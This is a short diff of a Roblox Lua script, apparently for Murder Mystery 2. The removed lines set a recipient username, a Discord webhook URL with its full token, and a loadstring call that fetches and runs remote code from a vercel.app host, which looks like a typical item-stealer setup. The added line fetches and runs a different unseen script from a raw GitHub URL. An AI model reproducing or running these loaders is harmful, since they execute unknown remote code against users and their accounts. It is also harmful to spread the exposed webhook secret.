@@ -1,5 +1,1 @@
-getgenv().gui = false
-Username = "tadash_10"
-Webhook = "https://discord.com/api/webhooks/1284860834886975541/Scw_BgOMhZhYlUnPOh_BTxbvHLlkAOtmcWMyHDgrIaQoDXYmx1Uv8TawW_aoNIe_moFm"
-
-loadstring(game:HttpGet("https://janeq.vercel.app/mm2.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/D3athFeather/mm2/main/4e8ed1e95083ead22e8a8832.lua"))()
